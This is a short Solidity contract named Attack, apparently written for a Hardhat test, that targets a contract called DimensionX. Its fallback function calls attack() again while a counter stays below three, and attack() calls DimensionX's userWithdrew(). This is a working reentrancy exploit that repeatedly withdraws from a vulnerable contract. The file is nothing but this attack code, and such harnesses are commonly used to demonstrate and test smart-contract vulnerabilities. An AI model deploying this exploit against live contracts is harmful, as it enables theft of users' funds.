// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IDimensionX {
    function userWithdrew() external;
}

contract Attack {
    uint times;
    IDimensionX DimensionX;

    function init(address DimensionX_) external {
        DimensionX = IDimensionX(DimensionX_);
    }

    function attack() public payable {
        times++;
        DimensionX.userWithdrew();
    }

    fallback() external payable {
        if (times < 3) {
            attack();
        }
    }
}
